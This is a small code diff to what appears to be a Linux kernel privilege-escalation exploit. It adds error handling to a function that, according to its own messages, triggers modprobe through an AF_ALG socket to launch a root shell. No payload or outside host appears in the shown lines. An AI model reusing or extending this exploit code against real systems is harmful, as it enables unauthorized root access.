@@ -270,13 +270,20 @@ void trigger_modprobe_sock(void)
 
 	printf("[!] triggering modprobe using AF_ALG socket to launch the root shell...\n");
 	alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
-	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
-	printf("[!] root shell is finished\n");
-
-	if (alg_fd >= 0) {
-		if (close(alg_fd) < 0)
-			perror("[-] close alg_fd");
+	if (alg_fd < 0) {
+		perror("[-] socket");
+		return;
 	}
+
+	if (bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
+		perror("[-] bind");
+		close(alg_fd);
+		return;
+	}
+
+	printf("[!] root shell is finished\n");
+	if (close(alg_fd) < 0)
+		perror("[-] close alg_fd");
 }
 
 int main(void)
